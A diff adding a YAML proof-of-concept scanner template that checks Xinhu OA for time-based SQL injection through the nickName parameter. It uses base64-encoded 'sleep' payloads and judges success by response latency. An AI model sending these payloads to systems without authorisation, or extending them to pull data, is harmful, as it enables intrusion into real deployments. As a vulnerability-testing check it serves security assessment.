@@ -1,0 +1,28 @@
+name: poc-yaml-xinhuOA-nickName-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDYpIw==
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDEwKSM=
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/141158186
+
